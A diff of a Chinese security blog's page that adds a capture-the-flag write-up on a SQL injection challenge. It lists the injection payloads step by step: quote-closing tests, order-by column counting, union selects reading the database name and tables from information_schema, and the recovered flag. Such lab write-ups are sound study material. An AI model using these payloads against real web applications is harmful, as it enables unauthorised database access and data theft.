@@ -75,6 +75,73 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-ccp-web-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/10/19/ccp-web-1/" class="article-date">
+  <time class="dt-published" datetime="2026-10-19T07:01:03.914Z" itemprop="datePublished">2026-10-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/10/19/ccp-web-1/">ccp-web-1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1>ccp-web-1</h1>
+<ul>
+<li>ccp考试中遇到的一道sql注入题目</li>
+</ul>
+<p>本题考点：sql注入</p>
+<p>打开靶场，是一个登入界面，先随便注册一个账号登入进去，发现是一个服务后台，可以看到有一个搜索工单界面，在搜索栏里面尝试:<br>
+<code>1' or 1=1 --+</code></p>
+<p><img src="/image/ccp-web-1/1.png" alt="alt text"></p>
+<p>发现<code>'</code>被拉入黑名单过滤了，再次翻找后台，发现个人资料里面也有输入框，<br>
+再次尝试:<code>1' or 1=1 --+</code>,发现可以注入，这样就成功找到注入入口</p>
+<p><img src="/image/ccp-web-1/2.png" alt="alt text"></p>
+<p>经过尝试，发现闭合字符是<code>'</code>，然后就可以构造:<br>
+<code>1' order by 1 --+</code>等来确定有几列</p>
+<ul>
+<li><code>order by 1</code>：按第 1 列排序，正常页面，代表存在第 1 列</li>
+<li><code>order by 2</code>：正常，存在第 2 列</li>
+<li><code>order by 3</code>：正常，存在第 3 列</li>
+</ul>
+<p>然后就是<br>
+<code>-1' union select 1,database(),33 --+</code><br>
+得到数据库名称:<strong>ctf_union</strong></p>
+<p><code>-1' union select 1,group_concat(table_name),3 from information_schema_tables where table_schema='ctf_union' --+</code><br>
+得到表名:<strong>flag，new</strong></p>
+<p><code>-1' union select 1,group_concat(column_name),3 from information_schema_columns where table_schema='ctf_union' and table_name='flag' --+</code><br>
+得到flag: <strong>flag{ebb1dd5a-d194-4352-b760-f266d301c5f7}</strong></p>
+<p><img src="/image/ccp-web-1/3.png" alt="alt text"></p>
+<p>这道题在sql注入部分和sql-lab-1的那道题基本一模一样，但是需要认真寻找注入口，搜索工单那个搜索栏确实是一个很阴的烟雾弹</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://xiafujian.github.io/2026/10/19/ccp-web-1/" data-id="cuid2Z7LbJszTPdtsoCc1JF7_" data-title="ccp-web-1" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL/" rel="tag">SQL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-鲲鹏杯web-night_patrol" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/10/16/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/" class="article-date">
@@ -1067,6 +1134,10 @@ GET:<br>
       <ul>
         
           <li>
+            <a href="/2026/10/19/ccp-web-1/">ccp-web-1</a>
+          </li>
+        
+          <li>
             <a href="/2026/10/16/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/">鲲鹏杯web-[night_patrol]</a>
           </li>
         
@@ -1080,10 +1151,6 @@ GET:<br>
         
           <li>
             <a href="/2026/09/29/sqli-lab-8~10/">sqli-lab-8~10的wp</a>
-          </li>
-        
-          <li>
-            <a href="/2026/09/28/sqli-lab-7/">sqli-lab-7的wp</a>
           </li>
         
       </ul>
